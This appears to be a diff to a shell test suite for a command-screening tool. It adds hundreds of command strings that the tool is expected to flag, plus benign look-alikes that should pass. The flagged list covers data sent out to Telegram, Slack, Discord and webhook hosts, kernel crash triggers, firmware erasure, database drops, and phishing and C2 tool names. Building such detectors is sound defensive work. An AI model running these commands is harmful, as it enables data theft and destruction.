@@ -11671,6 +11671,293 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+
+# ── cycle-243: mobile device control + RE/OSINT names + SCADA/telephony/
+#   queue + DB destructive + supply publish + CI/deploy + supervisor/
+#   journald + hardware/radio/input snoop + fake infra + phish/C2 extras
+for c in \
+    'adb shell x' 'adb install x' 'adb push x y' 'adb root' \
+    'adb reboot bootloader' 'adb sideload x' 'adb remount' \
+    'adb disable-verity' 'adb unroot' \
+    'fastboot flash boot x' 'fastboot oem unlock' 'fastboot erase x' \
+    'fastboot reboot' 'fastboot unlock' 'fastboot format x' \
+    'fastboot set_active a' \
+    'heimdall flash --BOOT x' \
+    'mtkclient x' 'edl flash x' 'edl qfil x' \
+    'scrcpy' 'sndcpy' \
+    'ideviceinstaller -i x' 'idevicebackup backup x' \
+    'idevicediagnostics ioreg x' 'ideviceinfo' 'idevicerestore x' \
+    'idevicepair pair' 'ios-deploy -b x' 'ifuse /mnt' 'iproxy 22 22' \
+    'idevicedebug run x' \
+    'checkra1n' 'palera1n' 'magisk' \
+    'frida -p x' 'frida-trace -i x' 'frida-ps -U' \
+    'objection -g x explore' 'apktool d x' 'jadx x' \
+    'apksigner sign x' 'apksigner rotate x' \
+    'd2j-dex2jar x' 'baksmali x' 'quark-engine -a x' 'drozer x' 'mobsf' \
+    'radare2 x' 'rabin2 -I x' 'rasm2 -d x' 'radiff2 x y' 'rizin x' \
+    'idat64 x' 'idat32 x' 'ghidra x' 'analyzeheadless /tmp x' \
+    'retdec-decompiler x' 'cutter -A x' 'binaryninja x' 'hopper -e x' \
+    'edb -run x' 'x64dbg x' 'x32dbg x' 'windbg -k x' \
+    'immunitydebugger x' 'pwndbg x' 'gef x' 'peda x' \
+    'capa -v x' 'floss -v x' 'binlex x' 'yara -r x y' 'yara x.yar f' \
+    'theharvester -d x' 'recon-ng' 'spiderfoot' 'sherlock -u x' \
+    'holehe x' 'ghunt x' 'phoneinfoga scan x' 'metagoofil -d x' \
+    'shodan search x' 'shodan host 1.2.3.4' 'shodan count x' \
+    'shodan download x' 'shodan scan submit x' 'shodan init x' \
+    'censys -h' 'dnstwist x' \
+    'trufflehog git x' 'gitleaks detect x' 'shhgit x' 'gitrob x' \
+    'detect-secrets scan x' \
+    'mbpoll x' 'modpoll x' 'snap7 x' 'pymodbus x' \
+    'asterisk -rx x' 'asterisk -r' 'fs_cli -x x' \
+    'kamcmd x' 'kamctl x' 'opensips-cli x' \
+    'mmcli -m 0 --command=x' 'qmicli -d x --nas' 'mbimcli --query-device-caps' \
+    'mosquitto_pub -t x -m y' 'mosquitto_sub -t x' \
+    'emqx ctl status' 'emqx eval x' 'emqx stop' 'emqx kill' \
+    'rabbitmqctl stop_app' 'rabbitmqadmin list queues' \
+    'kafka-topics --delete x' 'kafka-console-consumer x' \
+    'kafka-acls x' 'kafka-configs x' 'kafka-producer-perf-test x' \
+    'kafka-consumer-groups x' 'kafka-delete-records x' \
+    'pulsar-admin topics delete x' 'pulsar-client produce x' \
+    'nats-sub -s x y' 'zkcli x' 'flush_all' \
+    'psql -c "drop table x"' 'mysql -e "drop table x"' \
+    'sqlcmd -Q "drop table x"' 'cqlsh -e "drop table x"' \
+    'beeline -e "drop table x"' 'clickhouse-client -q "drop table x"' \
+    'influx delete x' 'bq rm x' 'snowsql -q "drop table x"' \
+    'arangosh --jsquery x' 'cypher-shell -u x' \
+    'db2 drop table x' 'impala-shell -q "drop table x"' \
+    'presto --execute "drop table x"' 'trino --execute "drop table x"' \
+    'npm publish' 'npm unpublish x' 'npm deprecate x' 'npm access x' \
+    'yarn publish' 'yarn unpublish x' 'yarn application -kill x' \
+    'twine upload x' 'cargo publish' 'cargo yank x' 'gem push x' \
+    'conan upload x' 'conan remove x' 'nuget push x' 'nuget delete x' \
+    'dotnet nuget push x' 'oras push x' \
+    'jfrog rt u x' 'jfrog rt del x' 'mvn deploy' 'mvn release:perform' \
+    'gradle publish' 'poetry publish' 'pnpm publish' \
+    'gh workflow run x' 'gh secret set x' 'gh variable set x' 'gh api x' \
+    'gh release delete x' 'gh release upload x y' 'gh repo delete x' \
+    'gh auth login' 'gh gpg-key add x' 'gh ssh-key add x' \
+    'gh run watch x' 'gh workflow disable x' 'gh workflow enable x' \
+    'glab ci run x' 'glab variable set x' 'glab release create x' \
+    'glab auth login' 'glab repo delete x' \
+    'fly set-pipeline x' 'fly destroy-pipeline x' 'fly hijack x' \
+    'fly trigger-job x' 'fly validate-pipeline x' 'fly unpause x' \
+    'flyctl destroy x' 'flyctl deploy' 'flyctl scale x' \
+    'flyctl secrets set x' 'flyctl ssh console' \
+    'jenkins-cli build x' 'java -jar jenkins-cli.jar x' \
+    'gitlab-runner register' 'gitlab-runner unregister x' \
+    'gitlab-runner exec x' \
+    'circleci run x' 'circleci build x' 'circleci orb pack x' \
+    'travis init x' 'travis encrypt x' 'travis ssh x' \
+    'drone build x' 'drone exec x' 'drone secret add x' \
+    'buildkite-agent start x' \
+    'sls deploy' 'sls remove' 'sls rollback' 'sls invoke x' \
+    'serverless deploy' 'serverless remove' 'sam deploy' 'sam delete' \
+    'railway delete' 'railway up' 'railway down' 'railway run x' \
+    'vercel rm x' 'vercel env add x' 'vercel delete x' 'vercel redeploy' \
+    'netlify unlink' 'netlify delete x' 'netlify deploy' 'netlify env:set x' \
+    'heroku apps:destroy x' 'heroku config:set x=y' 'heroku config:unset x' \
+    'heroku addons:destroy x' 'heroku ps:scale x=0' 'heroku maintenance:on' \
+    'heroku pg:kill x' 'heroku pg:reset x' \
+    'vagrant destroy' 'vagrant package' \
+    'pm2 delete x' 'pm2 kill' 'pm2 stop x' 'pm2 startup' 'pm2 save' \
+    'pm2 resurrect' 'pm2 reload x' 'pm2 restart x' 'pm2 unstartup' \
+    'supervisorctl stop x' 'supervisorctl shutdown' 'supervisorctl update' \
+    'supervisorctl restart x' 'supervisorctl signal x y' \
+    'supervisorctl remove x' 'supervisorctl add x' \
+    'monit unmonitor x' 'monit stop x' 'monit quit' 'monit reload' \
+    'monit restart x' 'monit monitor x' 'monit start x' \
+    'god stop x' 'god terminate' 'god restart x' 'god unmonitor x' \
+    'bluepill stop x' 'bluepill quit' 'bluepill restart x' 'bluepill load x' \
+    'svcadm disable x' 'svcadm delete x' 'svcadm clear x' 'svcadm mark x y' \
+    'svcadm restart x' 'svcadm refresh x' 'svcadm enable x' \
+    'journalctl --rotate' 'journalctl --flush' 'journalctl --sync' \
+    'journalctl --relinquish-var' 'journalctl --header' \
+    'echo c > /proc/sysrq-trigger' \
+    'flashrom -w x' 'flashrom -e' 'flashrom --erase' 'flashrom -p x' \
+    'dfu-util -d x' 'dfu-util -a 0' 'dfu-util -e' 'dfu-util -w' \
+    'avrdude -u x' 'avrdude -e' 'avrdude -c x' \
+    'esptool write_flash x y' 'esptool erase_flash' 'esptool flash_id' \
+    'esptool read_flash x y' 'esptool verify_flash x y' \
+    'esptool dump_mem x y z' 'esptool load_ram x' 'esptool write_mem x y' \
+    'esptool merge_bin x' 'esptool elf2image x' 'esptool run' \
+    'usbreset /dev/bus/usb/001/001' 'usb_modeswitch -v x' \
+    'openocd -f x' 'openocd -c x' \
+    'gpioset 0 1=1' 'i2cset -y 0 0x20 0x10 0xff' 'spidev x' \
+    'nandwrite -p /dev/mtd0 x' 'nandtest /dev/mtd0' 'ubiformat /dev/mtd0' \
+    'mtd_debug write /dev/mtd0 0 1 x' 'nanddump -f x /dev/mtd0' \
+    'hackrf_transfer -t x' 'hackrf_sweep' 'hackrf_specan' \
+    'rtl_sdr x' 'rtl_fm -f x' 'airprobe x' 'kalibrate x' \
+    'ubertooth x' 'btmon -w x' 'btproxy' 'bleah' 'crackle -i x' \
+    'hcitool scan' 'hcitool lescan' 'hcitool -i x cc y' 'gatttool -b x -I' \
+    'bluetoothctl pair x' 'bluetoothctl connect x' \
+    'bluetoothctl connectable on' 'bluetoothctl discoverable on' \
+    'bluetoothctl agent on' 'bluetoothctl power on' \
+    'proxmark3' 'pm3' 'mfoc -O x' 'mfcuk x' 'nfc-list' \
+    'killerbee x' 'zbwd' 'zbgoodfind x' 'zbreplay x' 'zbstumbler' \
+    'zbdump x' 'zbsniff' 'zbassocflood' \
+    'gps-sdr-sim x' 'gpsfaker x' 'fakegps' 'gnss-sdr x' \
+    'evtest /dev/input/event0' 'libinput debug-events' 'libinput record x' \
+    'showkey' 'dumpkeys' 'wev' 'wshowkeys' \
+    'xinput test x' 'xinput set-prop x' 'xinput map-to-output x y' \
+    'xinput float x' 'xinput reattach x y' 'xinput disable x' \
+    'xinput enable x' \
+    'hyprctl dispatch exec x' 'hyprctl keyword x y' 'hyprctl reload' \
+    'swaymsg exec x' 'swaymsg -m' 'i3-msg exec x' 'i3-msg -m' \
+    'fakedns -i x' 'fakenet x' 'inetsim' 'apatedns x' 'remnux x' \
+    'hiddeneye' 'hidden-eye' 'seeker -t x' 'socialfish' 'social-phish' \
+    'nexphisher' 'camphish' 'sayhello' 'stormbreaker' 'pyphisher' \
+    'madphish' 'mrphish' 'evilurl' \
+    'evil-winrm -i x' 'villain -g x' 'mythic -c' 'covenant -x' \
+    'havoc -x' 'darkcomet' 'poisonivy' 'poison-ivy' 'gh0st' \
+    'backdoor-factory x' 'bdfproxy' 'unicorn x.py' 'scarecrow -x' \
+    'nimcrypt x' 'nimplant' 'upx -d x' \
+    'printui /ga' 'printui /gd' 'printui /ge' 'printui /dd' \
+    'printuientry /ga' \
+    'verifier /standard' 'verifier /all' 'verifier /volatile' \
+    'verifier /boot' 'verifier /faults' \
+    'lpadmin -x x' 'lpadmin -p x' 'lpadmin -v x' 'lpadmin -e x' \
+    'cancel -a' 'lpmove x y' 'cupsdisable x' 'cupsreject x' \
+    'update-initramfs -u' 'update-initramfs -c' 'update-initramfs -d -k x' \
+    'mkinitrd -o x' 'mkinitrd -f x' 'update-grub' 'update-grub2' \
+    'grub2-mkconfig -o x' 'grub-mkconfig -o x' 'grub-install /dev/sda' \
+    'ssh-keygen -s ca -I x y' 'ssh-keygen -z x y' 'ssh-keygen -i -f x' \
+    'mutt -a x -s y z@w' 'mutt -s y z@w' 'mutt @ x' \
+    'mailx -a x z@w' 'mailx x @ y' 'sendmail < x' 'sendmail -t' \
+    'sendmail -f x' 's-nail -s x' 'mpack -s x y' \
+    'curl -d x api.telegram.org' 'curl -F x api.telegram.org' \
+    'wget --post-data=x api.telegram.org' 'xh -f api.telegram.org' \
+    'curl -d x hooks.slack.com/x' 'curl -d x discord.com/api/webhooks/x' \
+    'curl -d x webhook.site/x' 'curl -d x pipedream.net/x' \
+    'systemd-cryptenroll --tpm2 x' 'systemd-cryptenroll --fido2 x' \
+    'homectl create x' 'homectl remove x' 'homectl passwd x' \
+    'homectl update x' 'homectl rename x y' 'homectl deactivate x' \
+    'bootctl install' 'bootctl remove' 'bootctl update' 'bootctl set-default x' \
+    'udevadm trigger' 'udevadm test x' 'udevadm control --reload' \
+    'udevadm --reload' \
+    'clevis encrypt x' 'clevis luks bind x' 'clevis bind x' \
+    'fscrypt encrypt x' 'fscrypt purge x' 'fscrypt destroy x' \
+    'fscrypt lock x' 'fscrypt unlock x' \
+    'tomb dig x' 'tomb -f x' 'gocryptfs x y' 'encfs -x y' 'cryfs x y' \
+    'veracrypt -t x' 'veracrypt /t x' 'ecryptfs' \
+    'htpasswd -c x y' 'htpasswd -b x y z' 'htpasswd -B x y' \
+    'htpasswd -d x y' 'htpasswd -v x' \
+    'amtool silence add x' 'amtool alert query x' 'amtool expire x' \
+    'mimirtool x' 'grafana-cli admin x' 'grafana-cli plugins install x' \
+    'grafana-cli --homepath x' \
+    'onevm create x' 'onehost create x' 'pvesh delete x' 'pvesh set x' \
+    'pvesh create x' 'qm destroy x' 'qm stop x' 'qm shutdown x' \
+    'qm migrate x y' 'qm template x' 'qm clone x y' 'qm set x' \
+    'pct destroy x' 'pct stop x' 'pct exec x' \
+    'openstack server delete x' 'openstack server stop x' \
+    'openstack server remove x' 'nova delete x' 'nova stop x' \
+    'nova force-delete x' 'doctl compute delete x' \
+    'hcloud server delete x' 'hcloud server poweroff x' \
+    'hcloud server rebuild x' 'hcloud server shutdown x' \
+    'scw instance server delete x' 'scw instance server stop x' \
+    'oci compute instance terminate x' 'oci compute instance delete x' \
+    'govc vm.destroy x' 'govc vm.power -off x' 'govc vm.delete x' \
+    'govc datastore.rm x' 'govc host.shutdown x' \
+    'vim-cmd vmsvc/power.off x' 'vim-cmd vmsvc/destroy x' \
+    'vim-cmd vmsvc/unregister x' \
+    'esxcli vm process kill x' 'esxcli network firewall set x' \
+    'esxcli storage x' 'esxcli system x' \
+    'virtctl stop x' 'virtctl delete x' 'virtctl pause x' \
+    'virtctl migrate x' 'virtctl start x' 'virtctl console x' \
+    'rancher app x' 'rancher login x' 'rancher cluster x' \
+    'rancher server x' 'rancher delete x' 'rancher context x' \
+    'rke remove' 'rke up' 'rke etcd snapshot-save x' \
+    'k3d cluster delete x' 'k3d cluster create x' \
+    'kind delete cluster' 'kind create cluster' 'kind load x' \
+    'minikube delete' 'minikube stop' 'colima delete' 'colima stop' \
+    'colima start' 'docker swarm leave' 'docker swarm join x' \
+    'docker swarm update x' 'docker swarm init' \
+    'ctr task exec x' 'ctr rm x' 'ctr kill x' 'umoci unpack x' \
+    'skopeo copy x y' 'cosign sign x' 'cosign attest x' 'cosign upload x' \
+    'helmfile apply' 'helmfile sync' 'helmfile destroy' 'helmfile delete' \
+    'argocd app delete x' 'argocd app sync x' 'argocd cluster add x' \
+    'argocd repo add x' 'argocd app set x' \
+    'flux delete x' 'flux suspend x' 'flux uninstall' 'flux reconcile x' \
+    'certbot delete' 'certbot revoke x' 'certbot unregister' \
+    'certbot --cert-name x delete' 'kubeseal --format x' \
+    'sops -d x' 'sops --decrypt x' 'sops updatekeys x' 'sops rotate x' \
+    'spark-submit x' 'flink run x' 'flink cancel x' 'flink stop x' \
+    'flink savepoint x' \
+    'oozie job -oozie x -run' 'oozie -dryrun x' 'oozie sla x' \
+    'oozie bundle x' 'oozie validate x' 'oozie submit x' \
+    'airflow dags trigger x' 'airflow db reset' 'airflow scheduler' \
+    'airflow webserver' 'airflow celery x' 'airflow users delete x' \
+    'airflow connections add x' 'airflow variables set x' \
+    'airflow dags delete x' \
+    'sqoop eval x' 'distcp x y' \
+    'huggingface-cli upload x' 'huggingface-cli delete x' \
+    'driftnet' 'xplico x' 'text2pcap x y' 'mergecap -w x y' 'editcap x y' \
+    'trafgen x' 'mausezahn x' 'mz -x' 'nemesis x' 'parprouted x' 'zarp' \
+    'lftp -c x' 'lftp mirror x' 'ncftpput x' 'ncftpget x' \
+    'autorunsc' 'handle64 x' 'logonsessions' \
+    'yarn -kill x' \
+    'electron --remote-debugging-port=9' 'electron --remote-debugging-pipe' \
+    'chromium --remote-debugging-port=9' 'chrome --remote-debugging-port=9' \
+    'firefox --remote-debugging' 'msedge --remote-debugging-port=9' \
+    'brave --remote-debugging-port=9' 'open --remote-debugging-port 9' \
+    'run --remote-debugging-pipe'; do \
+  ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+      && check "paste: $c flagged" "1" "1" \
+      || check "paste: $c flagged" "0" "1"; done
+
+# benign pairs: real-word names without hostile context stay clean
+for c in \
+    'adb devices' 'adb --version' 'fastboot devices' 'heimdall print-pit' \
+    'the heimdall gate' 'frida kahlo' 'a frida painting' \
+    'cutter x' 'the cutter tool' 'hopper' 'a hopper painting' \
+    'capa x' 'robert capa' 'floss daily' 'dental floss' \
+    'yara --version' 'yara rules' 'sherlock holmes' 'sherlock x' \
+    'shodan rank' 'a shodan black belt' 'censys docs' \
+    'asterisk symbol' 'asterisk -V' 'the asterisk key' 'emqx start' \
+    'nats server' 'psql --version' 'npm install x' 'npm test' \
+    'yarn add x' 'yarn build' 'yarn --version' 'cargo build' 'cargo test' \
+    'gem install x' 'nuget restore' 'mvn package' 'mvn install' \
+    'gradle build' 'poetry install' 'poetry add x' \
+    'gh pr list' 'gh pr view x' 'gh repo view' 'glab mr list' \
+    'fly status' 'fly logs' 'circleci --help' 'travis --help' \
+    'the drone flew' 'drone video' 'sls --version' 'serverless --version' \
+    'sam build' 'railway status' 'vercel ls' 'vercel whoami' \
+    'netlify status' 'netlify ls' 'heroku apps' 'heroku ps' \
+    'vagrant status' 'vagrant ssh-config' 'vagrant up' \
+    'pm2 list' 'pm2 logs' 'pm2 status' 'supervisorctl status' \
+    'monit status' 'monit summary' 'a god complex' 'god mode' \
+    'svcadm list' 'journalctl -xe' 'journalctl -u x' 'journalctl -f' \
+    'journalctl --list-boots' 'flashrom -r x' 'flashrom --read x' \
+    'dfu-util -l' 'avrdude -v' 'esptool --version' 'usbreset --help' \
+    'openocd --version' 'hackrf_info' 'hcitool dev' 'hcitool con' \
+    'bluetoothctl show' 'bluetoothctl list' 'libinput list-devices' \
+    'xinput list' 'xinput --version' 'hyprctl version' \
+    'swaymsg -t get_outputs' 'i3-msg -t get_workspaces' \
+    'the hidden eye' 'seeker docs' 'the villain laughs' \
+    'a villain in the story' 'mythic quest' 'the mythic hero' \
+    'the covenant church' 'a covenant of peace' 'wreak havoc' \
+    'the havoc wreaker' 'a unicorn sticker' 'the unicorn startup' \
+    'scarecrow field' 'the scarecrow hat' 'tomb raider' 'the tomb of kings' \
+    'upx docs' 'verifier' 'verifier /driver' 'cancel x' 'cancel job 1' \
+    'lpmove' 'cupsenable x' 'ssh-keygen -f x -y' \
+    'mutt' 'mutt --version' 'mailx -s x y@z' 'sendmail -bv x' \
+    'curl -I api.telegram.org' 'wget https://api.telegram.org' \
+    'curl https://slack.com' 'homectl list' 'bootctl status' \
+    'udevadm info x' 'clevis' 'fscrypt status' 'the tomb' \
+    'gocryptfs' 'encfs' 'cryfs' 'htpasswd -n x' 'amtool check-config x' \
+    'promtool check rules x' 'qm list' 'pct list' 'nova --version' \
+    'a nova star' 'govc ls' 'kind of' 'a kind person' 'kind get clusters' \
+    'minikube status' 'colima status' 'rancher --version' \
+    'k3d cluster list' 'flux install' 'the flux capacitor' 'flux get all' \
+    'argocd app list' 'certbot certificates' 'sops file.yaml' \
+    'sops --version' 'flink list' 'oozie --version' 'airflow version' \
+    'huggingface-cli download x' 'lftp --version' 'osint docs' \
+    'db2 ' 'presto --version' 'trino --version' 'moby dick' \
+    'oberon moon' 'osmedeus' 'the seeker missile' \
+    'influx version' 'bq version' 'mbimcli --version' \
+    'impala-shell --version' 'vagrant global-status'; do \
+  ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+      && check "paste FP guard: $c clean" "0" "0" \
+      || check "paste FP guard: $c clean" "0" "1"; done
 # ── cycle-242: windows eventlog/defense/AD/boot/cert + unix
 #   net-config/audit/package ops + offensive-tool names +
 #   infra/cloud/container/cred-store/forensic primitives
@@ -12010,7 +12297,7 @@ for c in \
     'asciinema play' 'asciinema cat' 'kldstat' 'ipfw list' \
     'ipfw show' 'svcstat x' 'svok x' 'rcctl ls' 'rcctl ls failed' \
     'rcctl get x' 'service x status' 'kexec --version' \
-    'grubby --default-kernel' 'grub2-mkconfig' 'dracut' 'dracut -f' \
+    'grubby --default-kernel' 'dracut' 'dracut -f' \
     'dracut --list-modules' 'mkinitcpio -P' 'realm list' \
     'realm discover x' 'adcli info x' 'authselect current' \
     'authselect list' 'authconfig --test' 'cryptsetup status x' \
@@ -13431,7 +13718,7 @@ for c in \
         && check "paste: $c flagged" "0" "0" \
         || check "paste: $c flagged" "0" "1"
 done
-for c in 'ntdsutil local roles' 'printui /ge' 'verclsid /q' \
+for c in 'ntdsutil local roles' 'verclsid /q' \
          'runonce /runonce' 'sc query w32time' 'control printers' \
          'findstr /n x file.txt'; do
     ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
